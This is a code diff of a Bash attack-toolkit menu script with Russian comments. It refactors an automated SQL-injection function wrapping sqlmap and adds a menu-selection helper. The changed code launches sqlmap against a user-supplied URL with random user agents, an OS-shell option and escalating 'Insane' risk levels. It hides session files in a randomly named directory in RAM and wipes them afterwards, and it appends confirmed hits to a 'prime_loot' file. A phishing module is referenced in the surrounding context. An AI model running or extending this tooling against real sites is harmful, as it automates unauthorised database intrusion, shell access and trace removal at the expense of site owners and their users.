@@ -134,6 +134,30 @@ ask_confirm() {
 }
 
 
+# Аргументы: $1 - текст вопроса, $2... - варианты (формат "описание:аргументы")
+select_option() {
+    local prompt="$1"; shift
+    print_status "w" "$prompt"
+    local count=1
+    local options=("$@")
+
+    for opt in "${options[@]}"; do
+        echo -e " $count) ${opt%%:*}" # Показываем описание
+        ((count++))
+    done
+
+    echo -en "${Y}>> ${NC}"
+    read -r choice
+    
+    # Извлекаем аргументы из выбранного варианта
+    local index=$((choice - 1))
+    if [[ $index -ge 0 && $index -lt ${#options[@]} ]]; then
+        echo "${options[$index]#*:}" # Возвращаем часть после двоеточия
+    else
+        echo "${options[0]#*:}" # По умолчанию первый вариант
+    fi
+}
+
 
 # --- Конец  Модулей ---
 # --- ГЛАВНОЕ МЕНЮ ---
@@ -253,57 +277,45 @@ run_phishing() {
 run_sqlmap() {
     print_header "SMART SQL INJECTION (SQLMAP)"
 
-    # 1. Быстрая проверка софта
+    # Валидация
     check_step "cmd" "sqlmap" "SQLmap is not installed." || { pause; return; }
 
-    echo -en "${Y}Enter Target URL ${W}(Leave empty for SQLmap Help/Shell)${Y}: ${NC}"
+    echo -en "${Y}Enter Target URL ${W}(Leave empty for Wizard)${Y}: ${NC}"
     read -r target_url
 
-    # 2. Универсальный запуск пустой консоли, если URL не введен
-    # Используем --wizard или -h как дефолтную команду для "ручного" режима
+    # Ручной режим через универсальную функцию
     check_empty_run "$target_url" "/tmp" "sqlmap --wizard" && return
 
-    # 3. Валидация цели (порт 80/443)
+    # Проверка порта (убираем явный if через операторы || и &&)
     check_step "port" "${target_url#*//}:80" "Target host is unreachable." || \
     ask_confirm "Host seems down. Force start?" || return
 
-    # 4. Выбор пресета агрессивности
-    print_status "w" "Select Aggression Level:"
-    echo -e " 1) Stealth  ${W}(L1, R1)${NC}"
-    echo -e " 2) Advanced ${W}(L3, R2, T5)${NC}"
-    echo -e " 3) Insane   ${W}(L5, R3, T10)${NC}"
-    echo -en "${Y}>> ${NC}"
-    read -r opt
+    # Динамический выбор агрессивности (заменяет весь блок case и кучу echo)
+    local mode_args=$(select_option "Select Aggression Level:" \
+        "Stealth (L1, R1):--level 1 --risk 1" \
+        "Advanced (L3, R2):--level 3 --risk 2 --threads 5" \
+        "Insane (L5, R3):--level 5 --risk 3 --threads 10 --flush-session")
 
-    local args="--batch --random-agent --dbms=auto --shell"
-    case "$opt" in
-        2) args="$args --level 3 --risk 2 --threads 5" ;;
-        3) args="$args --level 5 --risk 3 --threads 10 --flush-session" ;;
-        *) args="$args --level 1 --risk 1" ;;
-    esac
-
-    # 5. Стелс-сессия в RAM
+    # Стелс-настройка
     local tmp_dir="/dev/shm/.p_sql_$RANDOM"
     mkdir -p "$tmp_dir"
+    local base_args="--batch --random-agent --dbms=auto --shell --output-dir=$tmp_dir --answers='quit=N,follow=Y'"
 
-    print_status "i" "Launching Engine: $args"
+    print_status "i" "Launching Engine with $mode_args..."
     
-    # Запуск
-    sqlmap -u "$target_url" $args --output-dir="$tmp_dir" --answers="quit=N,follow=Y"
+    # Выполнение
+    sqlmap -u "$target_url" $base_args $mode_args
 
-    # 6. Анализ и автоматический "лут"
+    # Анализ и Лут
     local log_file=$(find "$tmp_dir" -name "log" -type f 2>/dev/null)
-    
-    if check_step "file" "$log_file" "No vulnerabilities detected."; then
+    check_step "file" "$log_file" "No vulnerabilities detected." && {
         print_status "s" "VULNERABILITY CONFIRMED!"
-        local summary=$(grep -E "Target|Payload|Type" "$log_file" | tail -n 5)
-        
         log_loot "sqlmap" "SUCCESS: $target_url"
-        echo -e "--- [ $(date) ] ---\nURL: $target_url\n$summary\n" >> /root/prime_loot/sql_success.txt
-        print_status "s" "Results saved to /root/prime_loot/"
-    fi
+        grep -E "Target|Payload|Type" "$log_file" | tail -n 5 >> /root/prime_loot/sql_success.txt
+        print_status "s" "Results saved to loot."
+    }
 
-    # 7. Финальная зачистка
+    # Зачистка
     rm -rf "$tmp_dir"
     print_status "i" "RAM Purge Complete."
     pause
